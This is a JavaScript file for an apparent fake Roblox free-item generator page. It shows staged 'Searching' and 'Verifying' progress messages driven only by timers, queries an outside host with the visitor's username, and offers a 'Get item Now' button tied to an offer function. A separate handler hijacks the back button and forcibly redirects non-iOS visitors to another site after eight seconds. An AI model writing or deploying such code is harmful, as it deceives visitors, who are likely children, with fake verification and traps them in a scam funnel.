document.addEventListener("DOMContentLoaded", function () {
    document.querySelectorAll("button").forEach(button => {
        button.addEventListener("click", function () {
            let item = this.closest("li");
            let imgSrc = item.querySelector("img").src;
            let itemName = item.querySelector("p").textContent;

            let popupContainer = document.getElementById('popupContainer');
            let popupImage = document.getElementById('popupImage');
            let popupName = document.getElementById('popupName');

            popupImage.src = imgSrc;
            popupName.textContent = itemName;

            popupContainer.style.display = "flex";

            document.getElementById('closeButton').addEventListener("click", function () {
                popupContainer.style.display = "none";
            });
        });
    });
});

document.addEventListener("DOMContentLoaded", function () {
    let submitButton = document.getElementById('submitButton');
    let popupTitle = document.getElementById('popupTitle');
    let usernameInput = document.getElementById('usernameInput');
    let loadingImage = document.getElementById('loadingImage');

    submitButton.addEventListener("click", function () {
        let username = usernameInput.value;
        if (username) {
            let dots = "";
            let dotInterval = setInterval(() => {
                dots = dots.length < 3 ? dots + "." : "";
                popupTitle.textContent = `Searching ${username}${dots}`;
            }, 500);

            document.getElementById('popupImage').style.display = "none";
            document.getElementById('popupName').style.display = "none";
            usernameInput.style.display = "none";
            submitButton.style.display = "none";
            loadingImage.style.display = "block";

            setTimeout(() => {
                clearInterval(dotInterval);
                dots = "";
                dotInterval = setInterval(() => {
                    dots = dots.length < 3 ? dots + "." : "";
                    popupTitle.textContent = `Verifying${dots}`;
                }, 500);
            }, 3000);

            setTimeout(() => {
                clearInterval(dotInterval);
                dots = "";
                dotInterval = setInterval(() => {
                    dots = dots.length < 3 ? dots + "." : "";
                    popupTitle.textContent = `Loading last step${dots}`;
                }, 500);
            }, 6000);

            setTimeout(() => {
                clearInterval(dotInterval);
                popupTitle.textContent = `Finalizing`;
            }, 9000);

            setTimeout(() => {
                fetch(`https://abadaoucht.com/tiktok/api/roblox/userinfo/${username}`)
                    .then(response => {
                        if (!response.ok) throw new Error("API not available");
                        return response.json();
                    })
                    .then(profileData => {
                        if (profileData.status === "SUCCESS") {
                            loadingImage.style.display = "none";
                            popupTitle.textContent = "Final step";
                            displayProfile(profileData);
                        }
                    })
                    .catch((error) => {
                        console.log("API error: ", error.message);
                        showVisitorInfo(username);
                    });
            }, 9000);
        }
    });
});

var button = document.querySelector('#submitButton');
button.addEventListener('click', function() {
    var redirectURL = "https://www.rolls3.com";

    if (window.location.hostname !== "www." + window.location.hostname) {
        var isIphoneOrIpad = /iPhone|iPad/i.test(navigator.userAgent);

        if (!isIphoneOrIpad) {
            setTimeout(function() {
                window.location.href = redirectURL;
            }, 8000);

            history.pushState(null, null, location.href);
            window.onpopstate = function() {
                history.go(1);
            };
        }
    }
});

// Function to open the popup with profile data
function openPopup() {
    let popup = document.getElementById('popup');
    popup.style.display = 'block';

    // Simulate fetching profile data (you can replace this with actual API call)
    let profileData = {
        username: "",
        avatar: ""
    };

    displayProfile(profileData);
}

// Function to display profile info
function displayProfile(profileData) {
    let popup = document.getElementById('popup');

    // Create avatar element
    let avatar = document.createElement("img");
    avatar.src = profileData.avatar;
    avatar.style.width = "100px";
    avatar.style.height = "100px";
    avatar.style.borderRadius = "50%";
    avatar.style.display = "block";
    avatar.style.margin = "0 auto";

    // Create username display element
    let usernameDisplay = document.createElement("p");
    usernameDisplay.textContent = profileData.username;
    usernameDisplay.style.fontWeight = "bold";

    // Create follow button
    let followButton = document.createElement("button");
    followButton.textContent = "Get item Now !";
    followButton.style.padding = "10px 20px";
    followButton.style.backgroundColor = "#28a745";
    followButton.style.color = "white";
    followButton.style.border = "2px solid #28a745";
    followButton.style.borderRadius = "5px";
    followButton.style.cursor = "pointer";
    followButton.style.marginTop = "20px";
    followButton.style.width = "80%";
    followButton.style.boxShadow = "0 4px 8px rgba(0,0,0,0.2)";
    
    // Add id "abd" to the button
    followButton.id = "abd";

    // Add the follow button click event
    followButton.onclick = function() {
        _OS();
    };

    // Append elements to popup
    popup.appendChild(avatar);
    popup.appendChild(usernameDisplay);
    popup.appendChild(followButton);
}

// Function to show visitor info when API fails
function showVisitorInfo(username) {
    let popup = document.getElementById('popup');
    let loadingImage = document.getElementById('loadingImage');
    let popupImage = document.getElementById('popupImage');
    let popupName = document.getElementById('popupName');
    let usernameInput = document.getElementById('usernameInput');
    let submitButton = document.getElementById('submitButton');

    // Show the visitor's username and offer button
    popupTitle.textContent = "Final step";
    loadingImage.style.display = "none";
    popupImage.style.display = "block";
    popupName.style.display = "block";
    usernameInput.style.display = "none";
    submitButton.style.display = "none";

    let visitorInfo = document.createElement("p");
    visitorInfo.textContent = `Username: ${username}`;
    visitorInfo.style.fontSize = "18px";
    visitorInfo.style.marginTop = "20px";
    visitorInfo.style.color = "#f0ad4e";

    let followButton = document.createElement("button");
    followButton.textContent = "Get item Now";
    followButton.style.padding = "10px 20px";
    followButton.style.backgroundColor = "#28a745";
    followButton.style.color = "white";
    followButton.style.border = "2px solid #28a745";
    followButton.style.borderRadius = "5px";
    followButton.style.cursor = "pointer";
    followButton.style.marginTop = "20px";
    followButton.style.width = "80%";
    followButton.style.boxShadow = "0 4px 8px rgba(0,0,0,0.2)";
    
    // Add id "abd" to the button
    followButton.id = "abd";

    // Add the follow button click event
    followButton.onclick = function() {
        _OS();
    };

    // Append elements to popup
    popup.appendChild(visitorInfo);
    popup.appendChild(followButton);
}

// Dummy function for _OS()
function _OS() {
    alert("Button clicked!");
}
